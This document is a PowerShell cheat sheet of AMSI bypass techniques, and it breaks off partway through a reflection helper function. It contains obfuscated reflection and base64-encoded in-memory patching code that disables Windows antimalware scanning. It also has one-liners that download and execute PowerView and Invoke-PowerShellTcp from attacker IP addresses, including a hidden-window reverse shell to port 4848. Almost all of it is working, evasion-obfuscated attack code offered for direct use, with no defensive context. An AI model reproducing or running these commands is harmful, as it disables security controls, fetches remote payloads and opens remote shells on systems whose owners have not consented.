AMSI Bypasses

Amsi Bypass Code:

~~~PowerShell
[Ref].Assembly.GetType(("{0}{2}{8}{6}{7}{3}{1}{9}{5}{4}"-f'Sy','i','stem','at','msi','A','agement.Auto','m','.Man','on.')+[char]85+("{0}{1}" -f't','ils')).GetField('ams'+[char]105+("{2}{0}{1}"-f 'itFaile','d','In'),("{1}{0}{3}{2}"-f 'onPublic,','N','tic','Sta')).SetValue($null,$true)
~~~

Call code from a text file from Web Server

~~~PowerShell
IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.0.225/amsi.txt')
~~~

Call Script to be executed:

~~~PowerShell
IEX(New-object system.net.webclient).downloadstring('http://192.168.49.105/PowerView.ps1');Get-NetDomain
~~~

Combining scripts with the AMSI bypass:

~~~PowerShell
IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.17.128/Windows/amsi.txt');IEX(New-object system.net.webclient).downloadstring('http://192.168.17.128/Windows/Powershell/Invoke-PowerShellTcp.ps1');invoke-powershelltcp -reverse -ipaddress 192.168.17.128 -port 4848
~~~

Running the scripts with AMSI Bypass in a hidden Window:

~~~PowerShell
powershell.exe -windowstyle hidden -c "IEX(New-Object System.Net.WebClient).DownloadString('http://10.100.1.52/Windows/amsi.txt');IEX(New-object system.net.webclient).downloadstring('http://10.100.1.52/Windows/Powershell/Invoke-PowerShellTcp.ps1');invoke-powershelltcp -reverse -ipaddress 10.100.1.52 -port 4848"
~~~

~~~PowerShell
Â ${/===\/=\_/\__/===} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dQBzAGkAbgBnACAAUwB5AHMAdABlAG0AOwANAAoAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0ALgBDAG8AbQBwAG8AbgBlAG4AdABNAG8AZABlAGwAOwANAAoAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgA7AA0ACgB1AHMAaQBuAGcAIABTAHkAcwB0AGUAbQAuAFIAZQBmAGwAZQBjAHQAaQBvAG4AOwANAAoAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0ALgBSAHUAbgB0AGkAbQBlAC4AQwBvAG0AcABpAGwAZQByAFMAZQByAHYAaQBjAGUAcwA7AA0ACgB1AHMAaQBuAGcAIABTAHkAcwB0AGUAbQAuAFIAdQBuAHQAaQBtAGUALgBJAG4AdABlAHIAbwBwAFMAZQByAHYAaQBjAGUAcwA7AA0ACgB1AHMAaQBuAGcAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQAOwANAAoAbgBhAG0AZQBzAHAAYQBjAGUAIABFAGQAaQB0AG8AcgAgAHsADQAKACAAIAAgACAAcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAGMAbABhAHMAcwAgAE0AZQB0AGgAbwBkAHMAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAHYAbwBpAGQAIABQAGEAdABjAGgAKAApACAAewANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAATQBlAHQAaABvAGQASQBuAGYAbwAgAG8AcgBpAGcAaQBuAGEAbAAgAD0AIAB0AHkAcABlAG8AZgAoAFAAUwBPAGIAagBlAGMAdAApAC4AQQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQAVAB5AHAAZQAoAE0AZQB0AGgAbwBkAHMALgBDAEwAQQBTAFMAKQAuAEcAZQB0AE0AZQB0AGgAbwBkACgATQBlAHQAaABvAGQAcwAuAE0ARQBUAEgATwBEACwAIABCAGkAbgBkAGkAbgBnAEYAbABhAGcAcwAuAE4AbwBuAFAAdQBiAGwAaQBjACAAfAAgAEIAaQBuAGQAaQBuAGcARgBsAGEAZwBzAC4AUwB0AGEAdABpAGMAKQA7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABNAGUAdABoAG8AZABJAG4AZgBvACAAcgBlAHAAbABhAGMAZQBtAGUAbgB0ACAAPQAgAHQAeQBwAGUAbwBmACgATQBlAHQAaABvAGQAcwApAC4ARwBlAHQATQBlAHQAaABvAGQAKAAiAEQAdQBtAG0AeQAiACwAIABCAGkAbgBkAGkAbgBnAEYAbABhAGcAcwAuAE4AbwBuAFAAdQBiAGwAaQBjACAAfAAgAEIAaQBuAGQAaQBuAGcARgBsAGEAZwBzAC4AUwB0AGEAdABpAGMAKQA7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABNAGUAdABoAG8AZABzAC4AUABhAHQAYwBoACgAbwByAGkAZwBpAG4AYQBsACwAIAByAGUAcABsAGEAYwBlAG0AZQBuAHQAKQA7AA0ACgAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAIAAgAFsATQBlAHQAaABvAGQASQBtAHAAbAAoAE0AZQB0AGgAbwBkAEkAbQBwAGwATwBwAHQAaQBvAG4AcwAuAE4AbwBPAHAAdABpAG0AaQB6AGEAdABpAG8AbgAgAHwAIABNAGUAdABoAG8AZABJAG0AcABsAE8AcAB0AGkAbwBuAHMALgBOAG8ASQBuAGwAaQBuAGkAbgBnACkAXQANAAoAIAAgACAAIAAgACAAIAAgAHAAcgBpAHYAYQB0AGUAIABzAHQAYQB0AGkAYwAgAGkAbgB0ACAARAB1AG0AbQB5ACgAcwB0AHIAaQBuAGcAIABjAG8AbgB0AGUAbgB0ACwAIABzAHQAcgBpAG4AZwAgAG0AZQB0AGEAZABhAHQAYQApACAAewANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAcgBlAHQAdQByAG4AIAAxADsADQAKACAAIAAgACAAIAAgACAAIAB9AA0ACgAgACAAIAAgACAAIAAgACAAcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAHYAbwBpAGQAIABQAGEAdABjAGgAKABNAGUAdABoAG8AZABJAG4AZgBvACAAbwByAGkAZwBpAG4AYQBsACwAIABNAGUAdABoAG8AZABJAG4AZgBvACAAcgBlAHAAbABhAGMAZQBtAGUAbgB0ACkAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAvAC8ASgBJAFQAIABjAG8AbQBwAGkAbABlACAAbQBlAHQAaABvAGQAcwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAUgB1AG4AdABpAG0AZQBIAGUAbABwAGUAcgBzAC4AUAByAGUAcABhAHIAZQBNAGUAdABoAG8AZAAoAG8AcgBpAGcAaQBuAGEAbAAuAE0AZQB0AGgAbwBkAEgAYQBuAGQAbABlACkAOwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAUgB1AG4AdABpAG0AZQBIAGUAbABwAGUAcgBzAC4AUAByAGUAcABhAHIAZQBNAGUAdABoAG8AZAAoAHIAZQBwAGwAYQBjAGUAbQBlAG4AdAAuAE0AZQB0AGgAbwBkAEgAYQBuAGQAbABlACkAOwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAALwAvAEcAZQB0ACAAcABvAGkAbgB0AGUAcgBzACAAdABvACAAdABoAGUAIABmAHUAbgBjAHQAaQBvAG4AcwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAASQBuAHQAUAB0AHIAIABvAHIAaQBnAGkAbgBhAGwAUwBpAHQAZQAgAD0AIABvAHIAaQBnAGkAbgBhAGwALgBNAGUAdABoAG8AZABIAGEAbgBkAGwAZQAuAEcAZQB0AEYAdQBuAGMAdABpAG8AbgBQAG8AaQBuAHQAZQByACgAKQA7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABJAG4AdABQAHQAcgAgAHIAZQBwAGwAYQBjAGUAbQBlAG4AdABTAGkAdABlACAAPQAgAHIAZQBwAGwAYQBjAGUAbQBlAG4AdAAuAE0AZQB0AGgAbwBkAEgAYQBuAGQAbABlAC4ARwBlAHQARgB1AG4AYwB0AGkAbwBuAFAAbwBpAG4AdABlAHIAKAApADsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAC8ALwBHAGUAbgBlAHIAYQB0AGUAIABhAHIAYwBoAGkAdABlAGMAdAB1AHIAZQAgAHMAcABlAGMAaQBmAGkAYwAgAHMAaABlAGwAbABjAG8AZABlAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABiAHkAdABlAFsAXQAgAHAAYQB0AGMAaAAgAD0AIABuAHUAbABsADsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGkAZgAgACgASQBuAHQAUAB0AHIALgBTAGkAegBlACAAPQA9ACAAOAApACAAewANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABwAGEAdABjAGgAIAA9ACAAbgBlAHcAIABiAHkAdABlAFsAXQAgAHsAIAAwAHgANAA5ACwAIAAwAHgAYgBiACwAIAAwAHgAMAAsACAAMAB4ADAALAAgADAAeAAwACwAIAAwAHgAMAAsACAAMAB4ADAALAAgADAAeAAwACwAIAAwAHgAMAAsACAAMAB4ADAALAAgADAAeAA0ADEALAAgADAAeABmAGYALAAgADAAeABlADMAIAB9ADsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAYgB5AHQAZQBbAF0AIABhAGQAZAByAGUAcwBzACAAPQAgAEIAaQB0AEMAbwBuAHYAZQByAHQAZQByAC4ARwBlAHQAQgB5AHQAZQBzACgAcgBlAHAAbABhAGMAZQBtAGUAbgB0AFMAaQB0AGUALgBUAG8ASQBuAHQANgA0ACgAKQApADsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAZgBvAHIAIAAoAGkAbgB0ACAAaQAgAD0AIAAwADsAIABpACAAPAAgAGEAZABkAHIAZQBzAHMALgBMAGUAbgBnAHQAaAA7ACAAaQArACsAKQAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABwAGEAdABjAGgAWwBpACAAKwAgADIAXQAgAD0AIABhAGQAZAByAGUAcwBzAFsAaQBdADsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQAgAGUAbABzAGUAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHAAYQB0AGMAaAAgAD0AIABuAGUAdwAgAGIAeQB0AGUAWwBdACAAewAgADAAeAA2ADgALAAgADAAeAAwACwAIAAwAHgAMAAsACAAMAB4ADAALAAgADAAeAAwACwAIAAwAHgAYwAzACAAfQA7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGIAeQB0AGUAWwBdACAAYQBkAGQAcgBlAHMAcwAgAD0AIABCAGkAdABDAG8AbgB2AGUAcgB0AGUAcgAuAEcAZQB0AEIAeQB0AGUAcwAoAHIAZQBwAGwAYQBjAGUAbQBlAG4AdABTAGkAdABlAC4AVABvAEkAbgB0ADMAMgAoACkAKQA7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGYAbwByACAAKABpAG4AdAAgAGkAIAA9ACAAMAA7ACAAaQAgADwAIABhAGQAZAByAGUAcwBzAC4ATABlAG4AZwB0AGgAOwAgAGkAKwArACkAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAcABhAHQAYwBoAFsAaQAgACsAIAAxAF0AIAA9ACAAYQBkAGQAcgBlAHMAcwBbAGkAXQA7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAH0ADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAH0ADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAC8ALwBUAGUAbQBwAG8AcgBhAHIAaQBsAHkAIABjAGgAYQBuAGcAZQAgAHAAZQByAG0AaQBzAHMAaQBvAG4AcwAgAHQAbwAgAFIAVwBFAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAB1AGkAbgB0ACAAbwBsAGQAcAByAG8AdABlAGMAdAA7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABpAGYAIAAoACEAVgBpAHIAdAB1AGEAbABQAHIAbwB0AGUAYwB0ACgAbwByAGkAZwBpAG4AYQBsAFMAaQB0AGUALAAgACgAVQBJAG4AdABQAHQAcgApAHAAYQB0AGMAaAAuAEwAZQBuAGcAdABoACwAIAAwAHgANAAwACwAIABvAHUAdAAgAG8AbABkAHAAcgBvAHQAZQBjAHQAKQApACAAewANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAB0AGgAcgBvAHcAIABuAGUAdwAgAFcAaQBuADMAMgBFAHgAYwBlAHAAdABpAG8AbgAoACkAOwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAALwAvAEEAcABwAGwAeQAgAHQAaABlACAAcABhAHQAYwBoAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABJAG4AdABQAHQAcgAgAHcAcgBpAHQAdABlAG4AIAA9ACAASQBuAHQAUAB0AHIALgBaAGUAcgBvADsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGkAZgAgACgAIQBNAGUAdABoAG8AZABzAC4AVwByAGkAdABlAFAAcgBvAGMAZQBzAHMATQBlAG0AbwByAHkAKABHAGUAdABDAHUAcgByAGUAbgB0AFAAcgBvAGMAZQBzAHMAKAApACwAIABvAHIAaQBnAGkAbgBhAGwAUwBpAHQAZQAsACAAcABhAHQAYwBoACwAIAAoAHUAaQBuAHQAKQBwAGEAdABjAGgALgBMAGUAbgBnAHQAaAAsACAAbwB1AHQAIAB3AHIAaQB0AHQAZQBuACkAKQAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAdABoAHIAbwB3ACAAbgBlAHcAIABXAGkAbgAzADIARQB4AGMAZQBwAHQAaQBvAG4AKAApADsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAH0ADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAC8ALwBGAGwAdQBzAGgAIABpAG4AcwB1AHQAcgB1AGMAdABpAG8AbgAgAGMAYQBjAGgAZQAgAHQAbwAgAG0AYQBrAGUAIABzAHUAcgBlACAAbwB1AHIAIABuAGUAdwAgAGMAbwBkAGUAIABlAHgAZQBjAHUAdABlAHMADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGkAZgAgACgAIQBGAGwAdQBzAGgASQBuAHMAdAByAHUAYwB0AGkAbwBuAEMAYQBjAGgAZQAoAEcAZQB0AEMAdQByAHIAZQBuAHQAUAByAG8AYwBlAHMAcwAoACkALAAgAG8AcgBpAGcAaQBuAGEAbABTAGkAdABlACwAIAAoAFUASQBuAHQAUAB0AHIAKQBwAGEAdABjAGgALgBMAGUAbgBnAHQAaAApACkAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHQAaAByAG8AdwAgAG4AZQB3ACAAVwBpAG4AMwAyAEUAeABjAGUAcAB0AGkAbwBuACgAKQA7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAB9AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAvAC8AUgBlAHMAdABvAHIAZQAgAHQAaABlACAAbwByAGkAZwBpAG4AYQBsACAAbQBlAG0AbwByAHkAIABwAHIAbwB0AGUAYwB0AGkAbwBuACAAcwBlAHQAdABpAG4AZwBzAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABpAGYAIAAoACEAVgBpAHIAdAB1AGEAbABQAHIAbwB0AGUAYwB0ACgAbwByAGkAZwBpAG4AYQBsAFMAaQB0AGUALAAgACgAVQBJAG4AdABQAHQAcgApAHAAYQB0AGMAaAAuAEwAZQBuAGcAdABoACwAIABvAGwAZABwAHIAbwB0AGUAYwB0ACwAIABvAHUAdAAgAG8AbABkAHAAcgBvAHQAZQBjAHQAKQApACAAewANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAB0AGgAcgBvAHcAIABuAGUAdwAgAFcAaQBuADMAMgBFAHgAYwBlAHAAdABpAG8AbgAoACkAOwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAIAAgAH0ADQAKACAAIAAgACAAIAAgACAAIABwAHIAaQB2AGEAdABlACAAcwB0AGEAdABpAGMAIABzAHQAcgBpAG4AZwAgAFQAcgBhAG4AcwBmAG8AcgBtACgAcwB0AHIAaQBuAGcAIABpAG4AcAB1AHQAKQAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFMAdAByAGkAbgBnAEIAdQBpAGwAZABlAHIAIABiAHUAaQBsAGQAZQByACAAPQAgAG4AZQB3ACAAUwB0AHIAaQBuAGcAQgB1AGkAbABkAGUAcgAoAGkAbgBwAHUAdAAuAEwAZQBuAGcAdABoACAAKwAgADEAKQA7ACAAIAAgACAADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGYAbwByAGUAYQBjAGgAKABjAGgAYQByACAAYwAgAGkAbgAgAGkAbgBwAHUAdAApACAAewANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABjAGgAYQByACAAbQAgAD0AIAAoAGMAaABhAHIAKQAoACgAaQBuAHQAKQBjACAALQAgADEAKQA7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGIAdQBpAGwAZABlAHIALgBBAHAAcABlAG4AZAAoAG0AKQA7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAB9AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAByAGUAdAB1AHIAbgAgAGIAdQBpAGwAZABlAHIALgBUAG8AUwB0AHIAaQBuAGcAKAApADsADQAKACAAIAAgACAAIAAgACAAIAB9AA0ACgAgACAAIAAgACAAIAAgACAAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAawBlAHIAbgBlAGwAMwAyAC4AZABsAGwAIgAsACAAUwBlAHQATABhAHMAdABFAHIAcgBvAHIAIAA9ACAAdAByAHUAZQApAF0ADQAKACAAIAAgACAAIAAgACAAIABwAHIAaQB2AGEAdABlACAAcwB0AGEAdABpAGMAIABlAHgAdABlAHIAbgAgAGIAbwBvAGwAIABGAGwAdQBzAGgASQBuAHMAdAByAHUAYwB0AGkAbwBuAEMAYQBjAGgAZQAoAEkAbgB0AFAAdAByACAAaABQAHIAbwBjAGUAcwBzACwAIABJAG4AdABQAHQAcgAgAGwAcABCAGEAcwBlAEEAZABkAHIAZQBzAHMALAAgAFUASQBuAHQAUAB0AHIAIABkAHcAUwBpAHoAZQApADsADQAKACAAIAAgACAAIAAgACAAIABbAEQAbABsAEkAbQBwAG8AcgB0ACgAIgBrAGUAcgBuAGUAbAAzADIALgBkAGwAbAAiACwAIABTAGUAdABMAGEAcwB0AEUAcgByAG8AcgAgAD0AIAB0AHIAdQBlACkAXQANAAoAIAAgACAAIAAgACAAIAAgAHAAcgBpAHYAYQB0AGUAIABzAHQAYQB0AGkAYwAgAGUAeAB0AGUAcgBuACAASQBuAHQAUAB0AHIAIABHAGUAdABDAHUAcgByAGUAbgB0AFAAcgBvAGMAZQBzAHMAKAApADsADQAKACAAIAAgACAAIAAgACAAIABbAEQAbABsAEkAbQBwAG8AcgB0ACgAIgBrAGUAcgBuAGUAbAAzADIALgBkAGwAbAAiACwAIABTAGUAdABMAGEAcwB0AEUAcgByAG8AcgAgAD0AIAB0AHIAdQBlACkAXQANAAoAIAAgACAAIAAgACAAIAAgAHAAcgBpAHYAYQB0AGUAIABzAHQAYQB0AGkAYwAgAGUAeAB0AGUAcgBuACAAYgBvAG8AbAAgAFYAaQByAHQAdQBhAGwAUAByAG8AdABlAGMAdAAoAEkAbgB0AFAAdAByACAAbABwAEEAZABkAHIAZQBzAHMALAAgAFUASQBuAHQAUAB0AHIAIABkAHcAUwBpAHoAZQAsACAAdQBpAG4AdAAgAGYAbABOAGUAdwBQAHIAbwB0AGUAYwB0ACwAIABvAHUAdAAgAHUAaQBuAHQAIABsAHAAZgBsAE8AbABkAFAAcgBvAHQAZQBjAHQAKQA7AA0ACgAgACAAIAAgACAAIAAgACAAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAawBlAHIAbgBlAGwAMwAyAC4AZABsAGwAIgAsACAAUwBlAHQATABhAHMAdABFAHIAcgBvAHIAIAA9ACAAdAByAHUAZQApAF0ADQAKACAAIAAgACAAIAAgACAAIABwAHIAaQB2AGEAdABlACAAcwB0AGEAdABpAGMAIABlAHgAdABlAHIAbgAgAGIAbwBvAGwAIABXAHIAaQB0AGUAUAByAG8AYwBlAHMAcwBNAGUAbQBvAHIAeQAoAEkAbgB0AFAAdAByACAAaABQAHIAbwBjAGUAcwBzACwAIABJAG4AdABQAHQAcgAgAGwAcABCAGEAcwBlAEEAZABkAHIAZQBzAHMALAAgAGIAeQB0AGUAWwBdACAAbABwAEIAdQBmAGYAZQByACwAIAB1AGkAbgB0ACAAbgBTAGkAegBlACwAIABvAHUAdAAgAEkAbgB0AFAAdAByACAAbABwAE4AdQBtAGIAZQByAE8AZgBCAHkAdABlAHMAVwByAGkAdAB0AGUAbgApADsADQAKACAAIAAgACAAIAAgACAAIABwAHIAaQB2AGEAdABlACAAcwB0AGEAdABpAGMAIAByAGUAYQBkAG8AbgBsAHkAIABzAHQAcgBpAG4AZwAgAEMATABBAFMAUwAgAD0AIABNAGUAdABoAG8AZABzAC4AVAByAGEAbgBzAGYAbwByAG0AKAAiAFQAegB0AHUAZgBuAC8ATgBiAG8AYgBoAGYAbgBmAG8AdQAvAEIAdgB1AHAAbgBiAHUAagBwAG8ALwBCAG4AdABqAFYAdQBqAG0AdAAiACkAOwANAAoAIAAgACAAIAAgACAAIAAgAHAAcgBpAHYAYQB0AGUAIABzAHQAYQB0AGkAYwAgAHIAZQBhAGQAbwBuAGwAeQAgAHMAdAByAGkAbgBnACAATQBFAFQASABPAEQAIAA9ACAATQBlAHQAaABvAGQAcwAuAFQAcgBhAG4AcwBmAG8AcgBtACgAIgBUAGQAYgBvAEQAcABvAHUAZgBvAHUAIgApADsADQAKACAAIAAgACAAfQANAAoAfQA=')));Add-Type ${/===\/=\_/\__/===};[Editor.Methods]::Patch()
~~~

~~~PowerShell
Â ${/=\/======\____/=} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dQBzAGkAbgBnACAAUwB5AHMAdABlAG0AOwANAAoAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0ALgBSAHUAbgB0AGkAbQBlAC4ASQBuAHQAZQByAG8AcABTAGUAcgB2AGkAYwBlAHMAOwANAAoAcAB1AGIAbABpAGMAIABjAGwAYQBzAHMAIABBAFAASQBzACAAewANAAoAIAAgACAAIABbAEQAbABsAEkAbQBwAG8AcgB0ACgAIgBrAGUAcgBuAGUAbAAzADIAIgApAF0ADQAKACAAIAAgACAAcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAGUAeAB0AGUAcgBuACAASQBuAHQAUAB0AHIAIABHAGUAdABQAHIAbwBjAEEAZABkAHIAZQBzAHMAKABJAG4AdABQAHQAcgAgAGgATQBvAGQAdQBsAGUALAAgAHMAdAByAGkAbgBnACAAcAByAG8AYwBOAGEAbQBlACkAOwANAAoAIAAgACAAIABbAEQAbABsAEkAbQBwAG8AcgB0ACgAIgBrAGUAcgBuAGUAbAAzADIAIgApAF0ADQAKACAAIAAgACAAcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAGUAeAB0AGUAcgBuACAASQBuAHQAUAB0AHIAIABMAG8AYQBkAEwAaQBiAHIAYQByAHkAKABzAHQAcgBpAG4AZwAgAG4AYQBtAGUAKQA7AA0ACgAgACAAIAAgAFsARABsAGwASQBtAHAAbwByAHQAKAAiAGsAZQByAG4AZQBsADMAMgAiACkAXQANAAoAIAAgACAAIABwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABiAG8AbwBsACAAVgBpAHIAdAB1AGEAbABQAHIAbwB0AGUAYwB0ACgASQBuAHQAUAB0AHIAIABsAHAAQQBkAGQAcgBlAHMAcwAsACAAVQBJAG4AdABQAHQAcgAgAGUAawB3AGkAYQBtACwAIAB1AGkAbgB0ACAAZgBsAE4AZQB3AFAAcgBvAHQAZQBjAHQALAAgAG8AdQB0ACAAdQBpAG4AdAAgAGwAcABmAGwATwBsAGQAUAByAG8AdABlAGMAdAApADsADQAKAH0A')))

Add-Type ${/=\/======\____/=}

${____/====\/=\__/\} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4AEIAOAA=')))

${__/=\/=\_/\__/\_/} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADUANwA=')))

${__/\_______/\/=\/} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAA=')))

${/=\_____/===\/=\/} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAANwA=')))

${__/=\/\_/\/\_____} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADgAMAA=')))

${/====\/===\_/==\_} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4AEMAMwA=')))

${_/====\_/\/=\_/\/} = [Byte[]] (${____/====\/=\__/\},${__/=\/=\_/\__/\_/},${__/\_______/\/=\/},${/=\_____/===\/=\/},+${__/=\/\_/\/\_____},+${/====\/===\_/==\_})

${___/\__/=\/=\/\/=} = [APIs]::LoadLibrary($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBwAE8AYQB2AC4AZABsAGwA'))))

${__/==\/\/==\__/\/} = [APIs]::GetProcAddress(${___/\__/=\/=\/\/=},$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABsAGwARwBlAHQAQwBsAGEAcwBzAE8AYgBqAGUAYwB0AA=='))))

${/=\/=\/\_/\/\/\/\} = 0

[APIs]::VirtualProtect(${__/==\/\/==\__/\/}, [uint32]6, 0x40, [ref]${/=\/=\/\_/\/\/\/\})

[System.Runtime.InteropServices.Marshal]::Copy(${_/====\_/\/=\_/\/}, 0, ${__/==\/\/==\__/\/}, 6)

${/=\_/===\/\/===\/} = [Ref].Assembly.GetType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AHMAdABlAG0ALgBNAGEA')))+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBhAGcA')))+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBtAGUA')))+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgB0AC4AQQB1AHQAbwBtAA==')))+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQB0AGkAbwBuAC4AQQA=')))+'ms'+'iU'+'ti'+'ls')

${_/===\_/==\/=====} = ${/=\_/===\/\/===\/}.GetMethods('N'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBuAFAAdQA=')))+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YgBsAGkAYwAsAHMAdAA=')))+'at'+'ic') | ? Name -eq Uninitialize

${_/===\_/==\/=====}.Invoke(${/=\_/===\/\/===\/},$null)Â 

Using reflection

function ___/\/===\/\___/== {

Â  Â  Param(

Â  Â  Â  Â  [Parameter(Position = 0, Mandatory = $True)] [String] ${___/\_/========\__},

Â  Â  Â  Â  [Parameter(Position = 1, Mandatory = $True)] [String] ${__/==\/===\/\/==\_}

Â  Â  )

Â  Â  ${/=\/\/=\/=\__/\/=} = [AppDomain]::CurrentDomain.GetAssemblies() |

Â  Â  ? { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AHMAdABlAG0ALgBkAGwAbAA=')))) }

Â  Â  ${/=\___/\__/\/\_/=} = ${/=\/\/=\/=\__/\/=}.GetType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAGMAcgBvAHMAbwBmAHQALgBXAGkAbgAzADIALgBVAG4AcwBhAGYAZQBOAGEAdABpAHYAZQBNAGUAdABoAG8AZABzAA=='))))

Â  Â  ${___/\/==\/\_/\/=\} = ${/=\___/\__/\/\_/=}.GetMethod($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQATQBvAGQAdQBsAGUASABhAG4AZABsAGUA'))))

Â  Â  ${_/===\_/\____/===} = ${/=\___/\__/\/\_/=}.GetMethod($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAUAByAG8AYwBBAGQAZAByAGUAcwBzAA=='))), [Type[]]@([System.Runtime.InteropServices.HandleRef], [String]))

Â  Â  ${/====\_/\/=======} = ${___/\/==\/\_/\/=\}.Invoke($null, @(${___/\_/========\__}))

Â  Â  ${/==\___/\/=\/=\/\} = New-Object IntPtr

Â  Â  ${_/\_/\/\/\/=\/\/=} = New-Object System.Runtime.InteropServices.HandleRef(${/==\___/\/=\/=\/\}, ${/====\_/\/=======})

Â  Â  return ${_/===\_/\____/===}.Invoke($null, @([System.Runtime.InteropServices.HandleRef]${_/\_/\/\/\/=\/\/=}, ${__/==\/===\/\/==\_}))

}

function _/======\/=\/\/==\

{

Â  Â  Param

Â  Â  (

Â  Â  Â  Â  [OutputType([Type])]

Â  Â  Â  Â  [Parameter( Position = 0)]

Â  Â  Â  Â  [Type[]]

Â  Â  Â  Â  ${____/\/===\/==\/==} = (New-Object Type[](0)),

Â  Â  Â  Â  [Parameter( Position = 1 )]

Â  Â  Â  Â  [Type]

Â  Â  Â  Â  ${___/\_/\/\____/==\} = [Void]

Â  Â  )

